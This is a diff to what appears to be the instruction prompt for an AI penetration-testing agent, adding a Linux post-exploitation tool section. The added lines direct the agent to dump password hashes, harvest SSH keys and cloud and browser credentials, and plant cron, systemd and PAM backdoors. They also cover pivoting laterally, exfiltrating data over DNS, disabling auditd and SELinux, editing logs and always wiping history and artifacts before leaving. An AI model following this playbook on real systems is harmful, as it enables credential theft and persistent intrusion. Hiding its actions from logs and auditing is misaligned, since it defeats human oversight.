@@ -87,6 +87,38 @@ Follow the path of least resistance. If a technique fails, move to the next — 
 - NFS no_root_squash: `showmount -e <target>` → mount → write SUID binary
 - Writable /etc/passwd or shadow: add root user
 
+**Linux post-exploitation (any access level, Linux only):**
+After gaining a shell on a Linux target, deploy linuxhook for comprehensive post-exploitation. 118 programs across 8 categories.
+- **FIRST:** `linuxhook detect_env` — detect bash/python3/perl/busybox availability, root status, kernel version, SELinux/AppArmor, container detection. Use the recommended exec method.
+- If bash is unavailable: add `--exec sh` or `--exec python3` to ALL linuxhook commands
+- Stealth modes: `--stealth base64` (encoded commands), `--stealth memfd` (memory-only execution), `--stealth shm` (/dev/shm execution)
+- **Recon:** `linuxhook local_recon_linux` — all-in-one system/user/network/process/security scan
+- **Credentials:** `linuxhook shadow_dump` — extract /etc/shadow password hashes
+- `linuxhook ssh_key_harvest` — harvest SSH private keys from all users
+- `linuxhook bash_history_secrets` — extract passwords and API keys from shell history
+- `linuxhook cloud_cred_harvest` — harvest AWS/GCP/Azure credentials
+- `linuxhook browser_creds_linux` — extract Chrome/Firefox saved passwords
+- `linuxhook credential_files_scan` — broad filesystem scan for credential files
+- **Privesc:** `linuxhook sudo_misconfig` — sudoers analysis including CVE-2021-3156, CVE-2023-22809
+- `linuxhook suid_sgid_scan` — SUID/SGID binaries with GTFOBins matching
+- `linuxhook capabilities_abuse` — dangerous Linux capabilities (cap_setuid, cap_sys_admin)
+- `linuxhook kernel_exploit_check` — DirtyPipe, DirtyCow, GameOver(lay), OverlayFS, nftables
+- `linuxhook docker_group_escape` — Docker group → root via host filesystem mount
+- **Persistence:** `linuxhook cron_persist --command CMD` — cron-based persistence
+- `linuxhook systemd_persist --command CMD --name svc` — systemd service persistence
+- `linuxhook ssh_authorized_keys --key 'ssh-rsa ...'` — SSH key persistence
+- `linuxhook pam_backdoor --password MASTER_PASS` — PAM authentication bypass
+- **Lateral:** `linuxhook ssh_pivot --target HOST` — SSH lateral movement with harvested keys
+- `linuxhook ansible_abuse` — exploit Ansible infrastructure for mass lateral movement
+- `linuxhook internal_scan --target CIDR --ports 22,80,443` — internal network discovery
+- **Evasion:** `linuxhook log_tamper --user USER --ip IP` — surgical log entry removal
+- `linuxhook auditd_evade --action stop` — disable Linux audit subsystem
+- `linuxhook selinux_bypass --action permissive` — set SELinux permissive
+- **Exfil:** `linuxhook data_stage --path PATH --password KEY` — stage and encrypt data
+- `linuxhook dns_tunnel_exfil --file PATH --domain DOMAIN` — DNS-based exfiltration
+- `linuxhook cleanup_linux` — ALWAYS run before exiting to clear history, logs, and artifacts
+- Skills: `skill search --tech linux,postexploit,privilegeescalation`
+
 **eBPF post-exploitation (root required, Linux only):**
 After gaining root on a Linux target, deploy kernel-level tools for stealth operations and credential harvesting.
 - `ebpf pam_sniff --duration 300` — capture cleartext passwords for all PAM-authenticated sessions (SSH, sudo, su, login)
@@ -256,6 +288,7 @@ For every confirmed finding, call `report_vulnerability`:
 | chisel / ligolo-ng | Pivoting and tunneling |
 | hashcat | Offline hash cracking |
 | ebpf | eBPF kernel-level post-exploitation — credential capture, process/file/connection hiding, traffic interception (root + Linux). Advanced evasion monitors: io_uring bypass, fileless exec (memfd), ptrace injection, cross-process memory, userfaultfd races, BPF integrity, netlink manipulation, seccomp self-modification |
+| linuxhook | Linux post-exploitation — shadow/SSH/history/cloud creds, sudo/SUID/cap/kernel privesc, cron/systemd/PAM persistence, SSH pivot/Ansible lateral, log/audit evasion, DNS/ICMP exfil (any access + Linux) |
 | winhook | Windows userland post-exploitation — LSASS/SAM dump, DPAPI decrypt, keylogging, AMSI/ETW bypass, clipboard sniffing (Administrator + Windows) |
 | machook | macOS post-exploitation — Keychain dump, browser creds, DTrace monitoring, TCC bypass, XProtect enumeration (root + macOS) |
 | awshook | AWS post-exploitation — IAM privesc, S3 dump, Lambda backdoor, SSM exec, CloudTrail manipulation, secrets extraction (AWS credentials required) |
